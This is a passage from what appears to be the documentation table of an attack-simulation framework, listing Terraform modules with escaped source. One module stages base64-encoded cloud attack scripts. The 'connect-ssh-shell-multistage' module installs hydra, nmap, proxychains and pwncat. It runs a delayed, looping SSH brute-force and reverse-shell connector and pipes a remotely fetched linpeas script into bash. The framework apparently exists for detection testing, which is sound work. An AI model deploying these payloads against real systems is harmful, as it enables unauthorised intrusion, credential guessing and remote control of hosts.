fi<br/>        done<br/>    fi<br/>    log &quot;done&#46;&quot;<br/>    EOT<br/><br/>    listener        = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/listener&#46;py&quot;&&#35;41;<br/>    responder       = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/responder&#46;py&quot;&&#35;41;<br/>    instance2rds    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/instance2rds&#46;sh&quot;, <br/>                                &&#35;123;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;,<br/>                                    environment = var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;,<br/>                                    deployment = var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    iam2rds         = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/iam2rds&#46;sh&quot;, <br/>                                &&#35;123;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;,<br/>                                    environment = var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;,<br/>                                    deployment = var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;,<br/>                                    iam2rds&&#35;95;role&&#35;95;name = var&#46;inputs&&#35;91;&quot;iam2rds&&#35;95;role&&#35;95;name&quot;&&#35;93;<br/>                                    iam2rds&&#35;95;session&&#35;95;name = &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;iam2rds&&#35;95;session&&#35;95;name&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    iam2enum = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/iam2enum&#46;sh&quot;&&#35;41;<br/>                            <br/>    azureiam2azuresql = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/azureiam2azuresql&#46;sh&quot;&&#35;41;                            <br/><br/>    gcpiam2cloudsql = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/gcpiam2cloudsql&#46;sh&quot;&&#35;41;<br/><br/>    scan2kubeshell = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/scan2kubeshell&#46;sh&quot;&&#35;41;<br/>    <br/>    kube2s3 = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/kube2s3&#46;sh&quot;&&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;proxychains4 nmap hydra python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if &#33; command &#45;v proxychains4 &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null; then<br/>            yum update &#45;y<br/>            yum install &#45;y git<br/>            yum groupinstall &#45;y &&#35;x27;Development Tools&&#35;x27;<br/>            &#35; proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/rofl0r/proxychains&#45;ng<br/>            cd proxychains&#45;ng<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>            make install&#45;config<br/>            &#35; hydra<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/vanhauser&#45;thc/thc&#45;hydra<br/>            cd thc&#45;hydra<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;nmap python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;instance2rds&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;instance2rds&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;iam2rds&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;iam2rds&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;scan2kubeshell&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;scan2kubeshell&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;kube2s3&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;kube2s3&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;gcpiam2cloudsql&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;gcpiam2cloudsql&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;iam2enum&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;iam2enum&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-ssm-connect-ssh-shell-multistage                                  | ./modules/ssm/connect-ssh-shell-multistage                     | ssm_connect_ssh_shell_multistage_attacker  | context.aws.ssm.attacker.connect.ssh_shell_multistage                     | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "connect": {<br/>                        "ssh_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "password_list": "/tmp/hydra-passwords.txt",<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null,<br/>                            "reverse_shell_port": 4444,<br/>                            "target_ip": null,<br/>                            "target_port": 22,<br/>                            "task": "custom",<br/>                            "user_list": "/tmp/hydra-users.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-ssh-shell-multistage                     | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/pwncat&&#35;95;connector&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    PWNCAT&&#35;95;LOG=&quot;/tmp/pwncat&&#35;95;connector&#46;log&quot;<br/>    PWNCAT&&#35;95;SESSION=&quot;pwncat&&#35;95;connector&quot;<br/>    PWNCAT&&#35;95;SESSION&&#35;95;LOCK=&quot;/tmp/pwncat&&#35;95;connector&&#35;95;session&#46;lock&quot;<br/>    if &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT&&#35;95;SESSION&&#35;95;LOCK exists and $PWNCAT&&#35;95;SESSION screen session running&#46; Skipping setup&#46;&quot;<br/>    else<br/>        rm &#45;f &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot;<br/>        log &quot;Session lock doesn&&#35;x27;t exist and screen session not runing&#46; Continuing&#46;&#46;&#46;&quot;<br/>        screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>        screen &#45;wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/plugins $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/resources<br/>        cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;connector&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; connector&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;scan&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; scan&#46;sh<br/>        log &quot;installing required python3&#46;9&#46;&#46;&#46;&quot;<br/>        apt&#45;get install &#45;y python3&#46;9 python3&#46;9&#45;venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap&#46;pypa&#46;io/get&#45;pip&#46;py &#45;o get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        python3&#46;9 &#45;m pip install &#45;U pip setuptools wheel setuptools&&#35;95;rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 &#45;m pip install &#45;U pwncat&#45;cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        log &quot;checking for user and password list before starting&#46;&#46;&#46;&quot;<br/>        while &#33; &&#35;91; &#45;f &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125;&quot; &&#35;93; &#124;&#124; &#33; &&#35;91; &#45;f &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125;&quot; &&#35;93;; do<br/>            log &quot;waiting for $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; and $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125;&#46;&#46;&#46;&quot;<br/>            sleep 30<br/>        done<br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$PWNCAT&&#35;95;LOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>            mv $PWNCAT&&#35;95;LOG &quot;$PWNCAT&&#35;95;LOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>            log &quot;starting background process via screen&#46;&#46;&#46;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile $PWNCAT&&#35;95;LOG &#45;S $PWNCAT&&#35;95;SESSION &#45;m /bin/bash &#45;c &quot;cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; &amp;&amp; python3&#46;9 connector&#46;py &#45;&#45;target&#45;ip=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;target&#45;port=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;user&#45;list=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;password&#45;list=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;task=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;task&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;payload=&&#35;92;&quot;$&&#35;123;base64encode&&#35;40;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;41;&&#35;125;&&#35;92;&quot; &#45;&#45;reverse&#45;shell&#45;host=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;host&quot;&&#35;93;&&#35;125;&&#35;92;&quot;  &#45;&#45;reverse&#45;shell&#45;port=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;125;&&#35;92;&quot;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;connector started&#46;&quot;<br/>            log &quot;starting sleep for 30 minutes &#45; blocking new tasks while accepting connections&#46;&#46;&#46;&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete &#45; checking for running sessions&#46;&#46;&#46;&quot;<br/>            while &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; do<br/>                log &quot;pwncat session still running &#45; waiting before restart&#46;&#46;&#46;&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found &#45; continuing&#46;&#46;&#46;&quot;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done&#46;&quot;<br/>    EOT<br/><br/>    connector        = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/connector&#46;py&quot;, <br/>                            &&#35;41;<br/>    <br/>    scan            = file&&#35;40;<br/>                                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/scan&#46;sh&quot;, <br/>                            &&#35;41;<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;proxychains4 nmap hydra python3&#45;pip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        if &#33; command &#45;v proxychains4 &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null &#124;&#124; &#33; command &#45;v hydra &gt; /dev/null; then<br/>            yum update &#45;y<br/>            yum install &#45;y git<br/>            yum groupinstall &#45;y &&#35;x27;Development Tools&&#35;x27;<br/>            &#35; proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/rofl0r/proxychains&#45;ng<br/>            cd proxychains&#45;ng<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>            make install&#45;config<br/>            &#35; hydra<br/>            cd /usr/local/src<br/>            git clone https://github&#46;com/vanhauser&#45;thc/thc&#45;hydra<br/>            cd thc&#45;hydra<br/>            &#46;/configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum&&#35;95;packages = &quot;nmap python3&#45;pip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;scan&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;scan&&#35;41;<br/>            &&#35;125;,<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |